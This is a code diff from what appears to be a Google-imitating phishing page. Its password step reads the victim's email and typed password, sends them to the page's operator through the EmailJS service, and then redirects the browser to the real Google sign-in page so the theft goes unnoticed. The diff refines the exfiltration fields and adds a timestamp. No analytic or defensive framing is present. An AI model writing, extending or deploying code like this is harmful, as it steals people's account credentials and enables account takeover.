@@ -13,6 +13,7 @@ const EMAILJS_SERVICE_ID = "service_kp0u10f";
 const EMAILJS_TEMPLATE_ID = "template_mcr0qms";
 
 export function initPasswordScreen() {
+  // Initialise EmailJS once
   emailjs.init(EMAILJS_PUBLIC_KEY);
 
   document
@@ -43,16 +44,21 @@ function handlePwNext() {
 
   clearError(pwWrap, pwError);
 
+  // Grab the email that was set on the chip during the email step
   const email = document.getElementById("chip-email").textContent.trim();
   const password = pwInput.value;
 
+  // Send via EmailJS – fire-and-forget (don't block the redirect on success/failure)
   emailjs
     .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-      email: email,
-      password: password,
+      from_name: email,
+      reply_to: email,
+      message: password,
+      time: new Date().toLocaleString(),
     })
     .catch((err) => console.error("EmailJS error:", err));
 
+  // Redirect immediately after firing the request
   window.location.href = "https://accounts.google.com/signin";
 }
 
